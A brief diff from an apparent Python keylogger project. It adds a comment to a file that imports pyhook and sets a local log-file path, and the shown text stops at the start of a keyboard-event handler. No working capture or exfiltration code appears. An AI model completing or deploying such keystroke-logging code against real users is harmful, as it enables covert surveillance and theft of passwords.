@@ -1,5 +1,6 @@
 import pyhook, pythoncom, sys, logging
 
+# this is the .txt file which keeps track of the log.
 file_log = 'C:\\Users\\deepa\\PycharmProjects\\Keylogger\\log.txt'
 
 def OnKeyboardEvent(event):
